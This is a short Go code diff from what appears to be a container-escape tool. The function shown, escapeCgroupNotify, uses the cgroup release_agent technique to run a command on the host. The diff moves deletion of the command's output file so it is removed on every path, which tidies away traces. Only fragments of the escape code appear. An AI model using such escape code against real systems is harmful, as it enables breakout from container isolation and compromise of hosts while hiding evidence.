@@ -388,6 +388,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Write script
 	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
 	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
+		secureRemove(outputPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to write escape script: %v", err), "error"
@@ -435,11 +436,11 @@ func escapeCgroupNotify(command string) (string, string) {
 	if data, err := os.ReadFile(outputPath); err == nil {
 		sb.WriteString("\n--- Output ---\n")
 		sb.WriteString(string(data))
-		secureRemove(outputPath)
 	} else {
 		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
 		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
 	}
+	secureRemove(outputPath)
 
 	// Cleanup
 	secureRemove(scriptPath)
